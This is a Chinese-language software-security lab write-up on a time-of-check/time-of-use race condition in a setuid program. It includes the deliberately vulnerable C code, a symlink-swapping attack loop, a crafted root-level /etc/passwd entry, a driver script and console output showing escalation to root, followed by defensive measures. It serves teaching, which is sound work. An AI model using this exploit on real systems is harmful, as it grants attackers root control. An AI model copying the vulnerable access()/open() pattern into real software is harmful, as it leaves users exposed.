#

#### 漏洞原理
通常在条件检查和实际资源使用之间存在一小段时间。检查过的条件如果在这段时间内发生变化，建立在检查结果上的使用授权就有安全问题了。  
在电商中普遍是商品超买超卖的问题也是如此。  


#### 漏洞试验
**特权漏洞程序**   
```
// vul.c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main()
{
    char *fn = "/tmp/X";
    char buffer[60];
    FILE *fp;

    scanf("%60s", buffer);
    if (!access(fn, W_OK))
    {
        fp = fopen(fn, "a+");
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    }
    else printf("No permission \n");

    return 0;
}
```
```
ubuntu@VM-0-17-ubuntu:~/jingtai$ gcc -o vul vul.c 
ubuntu@VM-0-17-ubuntu:~/jingtai$ sudo chown root vul
ubuntu@VM-0-17-ubuntu:~/jingtai$ sudo chmod 4755 vul
ubuntu@VM-0-17-ubuntu:~/jingtai$ sudo sysctl -w fs.protected_symlinks=0  # 关闭保护机制
```
在/tmp目录任何用户都可以在其中创建文件，但是不能修改其他用户文件(除了root用户)。所以需要access()来确保真实用户拥有对目标文件的写入权限。  
access()系统调用会检查真实用户的权限。open()函数会检查的是有效用户的权限。  



#### 攻击目标
在/etc/passwd新增一个拥有root权限的用户  
  

![](/software-security/img/race-1.png)

需要两个程序，一个循环运行漏洞程序，一个循环攻击程序。  
攻击程序: （A1）使/tmp/X指向用户拥有的权限 （A2）使/tmp/X指向/etc/passwd  
漏洞程序： （V1）assecc检查 （V2）open检查  
当发生 A1，V1，A2，V2的时候就有权限打开/etc/passwd并进行修改。



#### 攻击准备
**攻击程序**
```
// attack_process.c
#include <unistd.h>

int main()
{
    while(1)
    {
        unlink("/tmp/X");
        symlink("/dev/null", "/tmp/X");
        usleep(1000);

        unlink("/tmp/X");
        symlink("/etc/passwd", "/tmp/X");
        usleep(1000);
    }
    return 0;
}
```
```
gcc -o attack_process attack_process.c
```
unlink()函数： 为了改变一个符号链接，需要删除已有链接  
/dev/null是一个特殊的设备，任何用户都是可写的  


**准备输入文件passwd_input**  
/etc/passwrd数据的第二个字段是密码，如果不设为`x`,那么就不会区shadow中寻找密码  
第三个字段为0改进程就拥有root权限  

可以使用如下命令生成加密的密码，第一个参数是密码，第二个参数是盐值 
```
ubuntu@VM-0-17-ubuntu:~$ python3 -c "from crypt import crypt; print(crypt('test', 'abc'))"
abgOeLfPimXQo
ubuntu@VM-0-17-ubuntu:~$ perl -e 'print crypt("test", "abc")."\n"'
abgOeLfPimXQo
```

因此，输入文件可以是
```
testuser:abgOeLfPimXQo:0:0:testuser:/root:/bin/bash
```

!!! warning
    放在/etc/passwd中的密码和在shadow中的密码不一致，在shadow中的还经过了别的加密


**运行漏洞程序并加以监控**  
target_process.sh  
```
#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

while [ "$old" == "$new" ]
do 
    ./vul < passwd_input
    new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
```

**开始攻击**  
终端1
```
ubuntu@VM-0-17-ubuntu:~/jingtai$ ls
attack_process  attack_process.c  passwd_input  target_process.sh  vul  vul.c
ubuntu@VM-0-17-ubuntu:~/jingtai$ ./attack_process 
^C
```

终端2
```
ubuntu@VM-0-17-ubuntu:~/jingtai$ bash target_process.sh 
No permission 
No permission 
...
No permission 
No permission 
STOP... The passwd file has been changed
```

终端3
```
ubuntu@VM-0-17-ubuntu:~$ ll /tmp/X
ls: cannot access '/tmp/X': No such file or directory
ubuntu@VM-0-17-ubuntu:~$ ll /tmp/X
-rw-rw-r-- 1 root ubuntu 191709 Jul 29 19:23 /tmp/X
ubuntu@VM-0-17-ubuntu:~$ sudo rm /tmp/X
ubuntu@VM-0-17-ubuntu:~$ ll /tmp/X
-rw-rw-r-- 1 root ubuntu 91239 Jul 29 19:24 /tmp/X
ubuntu@VM-0-17-ubuntu:~$ sudo rm /tmp/X
ubuntu@VM-0-17-ubuntu:~$ ll /tmp/X
lrwxrwxrwx 1 ubuntu ubuntu 9 Jul 29 19:24 /tmp/X -> /dev/null
```

在终端2  
可以看到/etc/passwd文件已经发生变化，因此切换用户
```
ubuntu@VM-0-17-ubuntu:~/jingtai$ su testuser 
Password: test
root@VM-0-17-ubuntu:/home/ubuntu/jingtai# id
uid=0(root) gid=0(root) groups=0(root)
```
攻击成功



**注意:**
在试验过程中，如果/tmp/X所有者变成了root(拥有者应该是攻击者)，原因不明。出现这个情况可以删除/tmp/X重新尝试，或调整usleep睡眠时间  




#### 防御措施
**1.通过原子操作消除检查和使用之间的时间差**  
文件操作的原子化一般是通过对文件上锁来实现的，在大多操作系统中上锁不是硬性规定(通常被称为软锁)。  
操作系统在内核中也有很多检查和使用的情况,因此如果把检查和使用放在一个系统调用中，是可以利用内核中的上锁机制原子化的。  
按照这个想法，如果open()可以提供一个新的选项（**只是如果，并没有这个选项～**）， 比如：  
```
f=open("/tmp/X", O_WRITE | O_REAL_USER_ID);
```
O_REAL_USER_ID可以检查用户的真实用户id，这样access()就是多余的了。   


**2.重复检查和使用**
比如在程序中加入多次access(), open()重复代码，然后检查多次打开的文件是否相同，如果一次没满足条件，就不能攻击成功。  


**3.粘滞符号链接保护**
大部分竞态条件漏洞都与/tmp中的符号链接有关。因此ubuntu自带了fs.protected_symlinks这个保护机制。  
当打开了这个保护时，全局可写的粘滞目录中的符号链接只能在符号链接的所有者，跟随者(进程的有效id)和目录所有者的其中之一匹配时才能被跟随。

![](/software-security/img/race-2.png)




**4.最小权限原则**
在上面特权程序中实际时写入一个不需要权限就能写入的文件。因此最大的根本问题就是赋予程序的权限大于实际需求。  

```
uid_t real_uid = getuid(); // 得到真实用户id
uid_t eff_uid = geteuid(); // 得到有效用户id

seteuid(real_uid);  //临时关闭root权限

// 业务逻辑

seteuid(eff_uid);  //如有需要，在打开root权限
```
 

































